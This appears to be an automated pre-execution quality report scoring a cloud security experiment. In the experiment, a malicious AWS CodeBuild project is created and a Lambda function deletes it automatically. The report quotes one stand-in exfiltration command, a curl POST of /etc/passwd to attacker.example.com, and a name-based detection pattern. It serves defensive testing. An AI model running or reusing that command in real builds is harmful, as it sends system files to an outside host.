# PRE-EXECUTION QUALITY EVALUATION REPORT

## Experiment Information
- **SCE Node**: 1.3 SCE Experiment
- **Probe Type**: Reactive
- **Attack Nodes**: 1.2 Create Malicious CodeBuild Project
- **Evaluation Date**: 2024-01-15

## Factor 1: ACTION ↔ Attack Correspondence
**Score**: 100
**Justification**: 

The experiment implementation demonstrates **full correspondence** with the ADT attack node 1.2 "Create Malicious CodeBuild Project":

1. **Tactic Alignment**: Both the ADT and implementation target the creation of unauthorized/malicious CodeBuild projects as the attack vector. The ADT specifies `aws codebuild create-project` as the command, and the implementation uses `codebuild.create_project()` via boto3.

2. **Technique Alignment**: The ADT references TTP T1552.005 (Unsecured Credentials), and the implementation creates a project with a buildspec designed to simulate credential exfiltration (`curl -X POST https://attacker.example.com/exfil -d @/etc/passwd`).

3. **Dependencies Match**: The ADT specifies dependencies on `iam:PassRole` and `codebuild:CreateProject`. The implementation properly uses a service role (via CloudFormation's `CodeBuildServiceRole`) and calls the CreateProject API.

4. **Implementation Quality**: The code is well-structured with:
   - Proper error handling with try/except blocks
   - Comprehensive logging throughout
   - State management via `EXPERIMENT_STATE` dictionary
   - Realistic attack simulation with malicious-sounding project names and data exfiltration buildspec

---

## Factor 2: Defense ↔ Defense Correspondence
**Score**: 100
**Justification**: 

The experiment implements the reactive defense control specified in ADT node 1.5 "Incident Response" with high quality:

1. **Classification Match**: The ADT specifies the defense as "Reactive" with strategy "Automated project deletion" and mechanism "Lambda-triggered remediation". The implementation deploys exactly this:
   - CloudWatch Events Rule monitoring for CodeBuild CreateProject events
   - Lambda function (`ReactiveControlLambda`) that automatically deletes projects matching malicious patterns

2. **Mechanism Implementation**: The Lambda function correctly:
   - Receives CloudTrail events via CloudWatch Events
   - Parses the event to extract project name from `requestParameters`
   - Checks for malicious patterns (`'malicious'` or `'exfil'` in name)
   - Calls `codebuild.delete_project()` to remediate

3. **High-Quality Code Evidence**:
   - Infrastructure-as-Code via CloudFormation with proper IAM least privilege
   - Event-driven architecture matching the ADT's "real-time" requirement
   - Proper tagging for resource management
   - Lambda has appropriate permissions scoped to CodeBuild operations only
   - Comprehensive logging in Lambda for audit trail

4. **Integration with Detective Control**: The implementation also aligns with ADT node 1.4 "CodeBuild Activity Monitoring" through CloudTrail logging and CloudWatch Events integration.

---

## Factor 3: PROBE ↔ Defensive Intent Correspondence
**Score**: 100
**Justification**: 

The experiment's probe fully corresponds to the defensive intent specified in the ADT:

1. **Probe Type Alignment**: The experiment is explicitly testing the "Reactive Probe" question from ADT node 1.3: *"Can automatic remediation trigger?"*

2. **Hypothesis Verification**: The `hypothesis_verification()` function directly tests whether the reactive control achieved its defensive intent:
   - Waits for CloudTrail event propagation
   - Checks if the malicious project was deleted by the Lambda
   - Includes fallback manual Lambda invocation for testing when CloudTrail propagation is slow
   - Returns `True` only if the project was successfully removed

3. **Clear Success Criteria**: The probe has a binary outcome:
   - `True`: Reactive control worked (malicious project deleted)
   - `False`: Reactive control failed (malicious project still exists)

4. **End-to-End Validation**: The experiment validates the complete reactive control chain:
   - Attack execution → CloudTrail event → CloudWatch Events Rule → Lambda invocation → Project deletion

5. **Defensive Intent Coverage**: The experiment specifically validates that the organization can automatically respond to and remediate unauthorized CodeBuild project creation, which is the core defensive intent of node 1.5.

---

## FINAL SCORE CALCULATION

**Q_pre = 0.40 × [f1] + 0.30 × [f2] + 0.30 × [f3]**
**Q_pre = 0.40 × 100 + 0.30 × 100 + 0.30 × 100**
**Q_pre = 40 + 30 + 30**
Q_pre = 100.00

**Threshold**: 80
**Result**: Q_pre >= 80

## DECISION

**AUTHORIZE EXECUTION**

The experiment demonstrates excellent correspondence between the ADT specification and implementation across all three evaluation factors:

1. The attack action precisely mirrors the ADT attack node with high-quality implementation
2. The defensive mechanism is a faithful and well-engineered implementation of the specified reactive control
3. The probe directly validates the defensive intent with clear success criteria

---

## Recommendations

While the experiment scores perfectly, the following enhancements could be considered for future iterations:

1. **CloudTrail Latency Handling**: The experiment already handles CloudTrail propagation delays with manual Lambda invocation, but documenting expected wait times in the manifest would improve operational clarity.

2. **Multi-Pattern Detection**: Consider expanding the Lambda's detection patterns beyond just "malicious" and "exfil" to include other suspicious indicators for more robust real-world applicability.

3. **Metrics Collection**: Adding CloudWatch metrics in the Lambda to track detection/remediation counts would provide valuable operational insights.

4. **Alert Integration**: While the experiment focuses on automated remediation, integration with SNS for human notification would align with comprehensive incident response practices.